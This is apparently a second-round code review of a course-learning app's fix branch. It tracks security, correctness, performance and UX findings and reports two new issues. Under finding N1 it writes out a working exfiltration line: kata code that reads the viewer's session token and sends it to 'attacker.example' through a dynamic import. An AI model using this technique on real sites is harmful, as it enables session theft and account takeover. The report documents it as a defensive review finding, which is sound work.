# Review round 2: branch questie

Checks the round-1 fixes (`git diff wp11-integration...questie`, 46 fix commits) against `review-correctness.md`, `review-security.md`, `review-performance.md`, `review-ux.md` and the fix table in `review-fixes-server.md`. No code was changed.

## How it was checked

- Read every fix commit's diff and the code paths around it.
- `npm test`: 297/297 pass. `npm run typecheck`: clean.
- Scratch vitest file outside the repo (real Better Auth on a memory DB, the real `createApi`):
  - MCP key (`x-api-key`) on `/api/auth/list-sessions`, `get-session`, `update-user`, `api-key/create`.
  - Requests with `Sec-Fetch-Dest: json` and a session cookie on guarded routes and on `/api/auth/*` (finding N1).
  - 12 SVG art payloads through `artProblem`.
  - Every bundled course against the new narration and grader caps.
- code-review skill at level high on the fix diff, for regressions the fixes introduced.

## Summary

All critical and high findings from round 1 are closed except one part of correctness 4 / kata isolation: the new `Sec-Fetch-Dest` block does not cover `/api/auth/*`, so course kata code can still read the viewer's session token (N1, high). Every medium finding is closed; UX L10 (low) is still open. New: N1 (high, the gap above) and N2 (medium, a regression from the lazy-loading fix), plus six low residuals. The high review of the fix diff found nothing else in credits, jobs, the builder transaction, reminders, billing or library.

## Round-1 findings

### Correctness (review-correctness.md)

| # | Sev | Finding | Status | Evidence |
|---|---|---|---|---|
| 1 | critical | Stored XSS through course art | Closed | 319a70f: `builderProblems` rejects any `art` in user courses (`server/courses.ts:89`), so PUT and builds refuse it. `artProblem` now rejects handlers, `foreignObject`, `img`, `iframe`, `embed`, `object`, `animate`, `set` (`src/course/schema.ts:166`). Runtime art goes through DOMPurify SVG profile, dropped when DOMPurify can't run (`src/course/registry.ts:60`). 1cf7a46: CSP `script-src 'self' ...` without `'unsafe-inline'` on HTML pages (`server/media.ts:48`), so injected handlers can't run even if markup gets through. Scratch: 10 of 12 payloads rejected by the handler rule, 2 by the href rule; the only one that passes is a CSS `@import` (no script; bundled art only now). |
| 2 | high | One idempotency key buys unlimited AI calls | Closed | cb8b8e4: `spend` conflicts when `ref` differs (`server/credits.ts:99`); `charge` returns 409 `idempotency_conflict` on any replay and never calls `run` (`server/credits.ts:164`); narration replay is 409 (`server/narration.ts:152`). Mock replays go through `charge`, so no extra sessions. Test asserts `runs === 1`. The client makes a new key per action and never retries with an old one, so legitimate retries do not hit the 409. |
| 3 | high | Narration flat price, unbounded TTS | Closed | 308fdfb: `NARRATION_MAX_CHARS = 12_000` summed over `tracksOf` (`server/narration.ts:104`), 400 `too_large` on GET and POST. Largest bundled lesson: 2,430 characters (scratch). See R-low on the cap's margin. |
| 4 | high | Kata code runs same-origin with the viewer's session | **Partly open** | dba8745: `lockdown()` removes fetch, XHR, WebSocket, EventSource, WebTransport, importScripts, Worker, caches, BroadcastChannel in the worker (`src/code/runner.ts:50`), and the guard refuses `Sec-Fetch-Dest` script/json/style/worker (`server/api.ts:164`). But the guard runs after the `/auth/*` routes, so `import("/api/auth/get-session", { with: { type: "json" } })` still returns the session token. See N1. |
| 5 | medium | Concurrent builds on one key | Closed | ffae36e: `busy()` runs again inside the transaction that spends and enqueues (`server/builder.ts:167-178`); the spend joins that transaction. Test fires two same-key requests plus one other: statuses 202, 202, 429, one job. |
| 6 | medium | Refunded plan credits never expire | Closed | eb01cd9: `refund` writes an immediate `plan_expire` for the plan share when `plan_expires_at` (period end + grace) has passed (`server/credits.ts:122-127`), keyed `refund:<spendId>` so it can't collide with the lazy expiry row. Test covers refund after expiry and the balance 60 days later. Residual: R-low 3. |
| 7 | medium | Interrupted narration refunded but unlocked | Closed | 9084119: `failJob` deletes `narration_unlocks WHERE spend_id = ?` in the same transaction as the refund (`server/jobs.ts:58`), so boot recovery and the no-handler path are covered. Test: a job left `running` with `attempts = 2` is refunded and the lesson is locked again. |
| 8 | low | Rows left after account deletion | Closed | 9f9a4aa: `userOf` and checkout skip unknown users (`server/billing.ts:35-39`, `:90`); `finish` adds its event only when the UPDATE changed a row (`server/jobs.ts:68`); `runBuild` checks the job row before saving (`server/builder.ts:288`). Only the Stripe part has a test. |
| 9 | low | `wipeLocal` leaves cached courses and legacy progress | Closed | 599b12d: removes `ql.courses`, `ql.me`, `ql.seenJobs`, `ql.lowWarned`, `LEGACY_KEY`, `eq2.kata.*` (`src/engine/sync.ts:9-14`). |

### Security (review-security.md)

| # | Sev | Finding | Status | Evidence |
|---|---|---|---|---|
| 1 | critical | Stored XSS through art | Closed | Correctness 1. |
| 2 | high | MCP key gets full account via `/api/auth/*` | Closed | 85db9f4: `x-api-key` is deleted before `auth.handler` (`server/auth.ts:120-123`). Scratch with a real key and no cookie: `list-sessions` 401, `update-user` 401, `api-key/create` 401, `get-session` 200 `null`, `GET /notes` still 200. |
| 3 | high | Idempotency replay | Closed | Correctness 2. |
| 4 | high | Unbounded ElevenLabs spend per unlock | Closed | 308fdfb: character cap; migration 0011 adds `narration_unlocks.version`; a user-course unlock counts only for the theory version it paid for (`server/narration.ts:113-115`), and the upsert re-arms it only when the version differs. Editing theory then needs a new 10-credit unlock. Test covers it. Residual: R-low 1, R-low 2. |
| 5 | medium | Grader input unbounded | Closed | 19d3584: `graderChars` (prompt + model + key points + persona) capped at 20,000 in `builderProblems` (PUT and builds) and in `written()` at grade and improve time (`server/grading.ts:29`). Largest bundled written challenge: 2,231 (scratch). |
| 6 | medium | Approval not bound to the reviewed version | Closed | 3dd1a51: approve and reject require `version`; a mismatch is 409 inside the same transaction as the update (`server/library.ts:57-68`). The queue sends the version from the meta it listed (`src/library/api.ts:53-54`). |
| 7 | medium | Uploads left in the Files API | Closed | 7aea785: `deleteUserFiles` runs in `beforeDelete` before `purgeUser`; a failed delete sets `user_id = ''` so `purgeUser` leaves the row and the 24 h sweep deletes the file (`server/account.ts:40-44`). `uploads.user_id` has no foreign key, so the empty id is accepted. |
| 8 | medium | PUT runs the kata sandbox without limits | Closed | cf992d5: `course_put` 20/h (`server/api.ts:238`), 30 katas checked before any run (`server/courses.ts:109`), 4 children per process (`server/sandbox.ts:13-24`). Residual: R-low 4. |
| 9 | low | RevenueCat sandbox events | Closed | 2bb8b1d. |
| 10 | low | No body limit on `/auth/*`, `/webhooks/*` | Closed | 4ba1628: 256 KB, tests for both. |
| 11 | low | Remote images in course markdown | Closed | dc3a49d: `afterSanitizeAttributes` drops `src`/`srcset` unless same origin, API origin or `data:` (`src/ui/Md.tsx:15`). |

### Performance (review-performance.md)

| # | Sev | Finding | Status | Evidence |
|---|---|---|---|---|
| 1 | high | Builds block narration; player gives up after 5 min | Closed | b747fb2: one lane per kind, `JOB_CONCURRENCY` each (`server/jobs.ts:120-130`); test holds a build and finishes a narration job. 657d06f: the player asks `GET /jobs/:id` every 5 min instead of failing on a timer. Total concurrency doubles (2 builds + 2 narrations by default). |
| 2 | medium | fsync per commit | Closed | 8e794af: `synchronous = NORMAL`. |
| 3 | medium | New screens and auth client in the main chunk | Closed, with a regression | fe50612: 8 screens via `React.lazy`, Better Auth client via `getAuthClient()`. See N2: no error boundary for a failed chunk load. |
| 4 | medium | Job inputs parsed on every poll | Closed | 2e0177d: `idem_key` and `mode` columns with index (migration 0012, backfilled), `JOB_COLUMNS` excludes `input`, Home job cards poll with `after` and fold onto the previous view. |
| 5 | medium | Reminder sweep overlaps; FCM without timeout | Closed | ee0d184: `setTimeout` chain after each run; due rows marked in one transaction before sending; 10 s timeouts on both FCM fetches and web push. |
| 6 | low | Missing indexes | Closed | 704d0f5: migration 0013; expired mock sessions swept after a day. |
| 7 | low | Course list reads full JSON | Closed | 4583ff6. |
| 8 | low | Narration waits for the whole lesson | Closed | 657d06f: pool of 3, per-card readiness, native blob URLs kept per lesson. |
| 9 | low | Heartbeat never read | Rejected | Kept by plan; acceptable. |
| 10 | low | Hero loads both screenshots | Closed | 88ca9e4. |

### UX (review-ux.md)

| # | Sev | Finding | Status | Evidence |
|---|---|---|---|---|
| H1 | high | Mock exam unreachable | Closed | 9037e0d: Map shows the exam for any course with written challenges when `features.ai` (`src/screens/Map.tsx:35`); f435cd5: `POST /mock` accepts it with 30 minutes. |
| M1 | medium | Build failure never says why | Closed | 5a2996d: `failReason` maps `source_unreachable`, `too_few_sources`, `build_rejected`, `not_configured`, `rate_limited`; shown under `Build failed` and for start errors. The server throws exactly those codes (`server/builder.ts:281, 315, 316, 335`). |
| M2 | medium | Plan / top-up split goes stale | Closed | cbbcbc3: Credits and Profile call `loadMe()` on mount. |
| M3 | medium | Top-up sheet centered on phones | Closed | beb417e: `.overlay.overlay-sheet` outranks `.overlay`. |
| M4 | medium | Tabs and filters show no selected state | Closed | 76af4fd: selected option uses `btn`, others `btn ghost`, with `aria-pressed`; queue tabs are now toggle buttons, so no tab pattern is needed. |
| M5 | medium | Reset password dead end | Closed | fb36035: `Have an account? Sign in`. |
| M6 | medium | Light-mode state text fails AA | Closed | df1b5ca: `--ok-ink`, `--bad-ink`, `--gold-ink`. Measured: light 5.11-6.31:1 on bg, surface and sticky; dark 5.52-10.89:1. |
| L1-L9, L11, L12 | low | | Closed | 9312668, bc01fb1, 92baddf, 2fda92f, 67aa2bc, 1db7371, 31e727c, a395092, 184c017, 8c43577, 76af4fd. |
| L10 | low | Welcome flag in localStorage | Open | Not in any fix commit; `src/screens/Welcome.tsx:16-18` unchanged. |

## New findings

| # | Sev | Where | Finding |
|---|---|---|---|
| N1 | high | `server/api.ts:164`, `:226-228` | Kata code can still read the session token through `/api/auth/*` |
| N2 | medium | `src/App.tsx:25-32`, `:60` | Lazy screens with no error boundary: blank page after a deploy |

### N1. high: kata code can still read the session token through `/api/auth/*`

- Where: `server/api.ts:164` (the `SCRIPT_DESTS` check sits in `guard`), `server/api.ts:226-228` (`authRoutes` and `billingPublic` are mounted before `.use(guard)`), `server/media.ts:49` (`cspHeader` sets CSP only on `text/html`, so the kata worker script has none).
- Problem: `lockdown()` leaves `import()`, because it is syntax. dba8745 relies on the guard refusing `Sec-Fetch-Dest: json`/`script`, but the guard never runs for Better Auth routes. A JSON-module import from the worker is a same-origin request with the viewer's cookie.
- Scenario: a shared, linked or public user course has a kata test `const s = await import("/api/auth/get-session", { with: { type: "json" } }); await import("https://attacker.example/x.js?t=" + s.default.session.token).catch(() => {}); return eq(1, 1)`. The victim presses Run; the attacker uses the token as a bearer.
- Reproduced (server side, scratch vitest, real Better Auth): with a session cookie and `Sec-Fetch-Dest: json`, `GET /api/me` is 403, but `GET /api/auth/get-session` is 200 with `session.token`, and `GET /api/auth/list-sessions` is 200 with every session token. `GET /api/me` with that token as `Authorization: Bearer` is 200. The browser side (worker `import()` of a JSON module reaches the server with cookies) is what the fixer checked in Chromium against `/api/me`.
- Fix:
  1. Move the `Sec-Fetch-Dest` refusal into its own middleware mounted right after `cors` in `createApi`, before `/auth/*` and `/webhooks/*`. Add a test for `/auth/get-session` with `Sec-Fetch-Dest: json`.
  2. Defense in depth: serve the kata worker script with `Content-Security-Policy: script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval' https://cdn.jsdelivr.net/pyodide/; connect-src https://cdn.jsdelivr.net/pyodide/`, so `import("https://attacker...")` can't exfiltrate. The worker's policy comes from its own response.

### N2. medium: lazy screens have no error boundary; a deploy leaves open tabs blank

- Where: `src/App.tsx:25-32` (8 `lazy()` screens), `src/App.tsx:60` (`Suspense` without an error boundary); no `ErrorBoundary` or `vite:preloadError` handler anywhere in `src/`. Introduced by fe50612.
- Problem: a deploy replaces `dist/`, so the hashed chunk names an open tab knows are gone. `server/index.ts` answers `/assets/<old>.js` with 404, `lazy()` rejects, and with no boundary React unmounts the whole tree.
- Scenario: a user has the app open, a release ships, the user taps the credit chip (Credits), `Top up` (Plans), Build, Library or a job card. The page goes blank until a manual reload. Web only; native ships its assets.
- Fix: in `src/main.tsx`, `window.addEventListener("vite:preloadError", () => location.reload())`. Or wrap the `Suspense` in a small boundary that reloads once (guard with a `sessionStorage` flag so a real error can't loop).

## Residual (low, from the fixes)

1. Pre-0011 user-course unlocks have `version = NULL`, so they read as locked and charge again (`server/narration.ts:115`). Fix: treat a `NULL` version as a match and store the current version on that read.
2. Learners of a public user course pay again after the author edits a lesson's theory, and a player open during that edit shows `Audio failed · 10 credits refunded` with no refund (`src/narration/Narration.tsx:96`, `!s.unlocked` is read as a failed job). Fix: on `!s.unlocked` while waiting, check `jobStatus` before claiming a refund.
3. Plan credits refunded after a renewal (spend in period A, failure after the period-B grant) still roll into period B: `refund` only expires them when `plan_expires_at` has passed (`server/credits.ts:124-127`). Fix: compare the spend's `created_at` with the current period start, and expire the plan share when it predates it.
4. The 4-slot sandbox limiter is shared by all users and by builds. One account at 20 PUT/h x 30 katas x 2 runs x 5 s keeps a slot busy for up to 100 min/h; four parallel PUTs fill all slots and stall builds' kata checks. Fix: one validation at a time per user, or a total time budget per PUT (e.g. 60 s).
5. Page CSP allows all of `https://cdn.jsdelivr.net` (any npm package). Only the worker loads Pyodide. Fix: narrow to `https://cdn.jsdelivr.net/pyodide/` or drop it from the page policy.
6. User-course narration: 10 credits now buy up to 12,000 uncached TTS characters per lesson version (no cross-user cache for private courses). Check the ElevenLabs cost of 12k characters at the configured model against the price of 10 credits; a lower cap for user courses (bundled lessons are under 2.5k) keeps the margin.
